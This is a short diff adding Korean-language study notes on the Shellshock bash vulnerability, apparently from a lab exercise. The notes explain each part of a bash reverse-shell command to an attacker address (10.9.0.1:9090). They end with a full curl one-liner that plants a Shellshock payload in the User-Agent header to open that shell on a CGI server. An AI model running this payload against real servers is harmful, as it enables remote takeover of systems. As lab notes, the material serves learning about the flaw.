@@ -158,3 +158,13 @@ parse_and_execute(temp_string, name, SEVAL_NONINT | SEVAL_NONIST);
 		- export foo = ‘() { echo “hello” }; /bin/sh’
 
 ~# /bin/bash -i
+	bash 쉘을 인터렉티브 모드로 실행
+	사용자가 입력을 받을 수 있는 쉘을 의미
+>& /dev/tcp/10.9.0.1/9090
+	표준 출력을 리다이렉트. 파일 디스크립터 1이 /dev~로 리다이렉트
+	tcp연결. 공격자의 ip주소와 공격자의 포트
+0<&1
+	표준 입력인 0
+2>&1 
+	표준 에러인 2
+curl -A “() { echo hello; }; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 ”
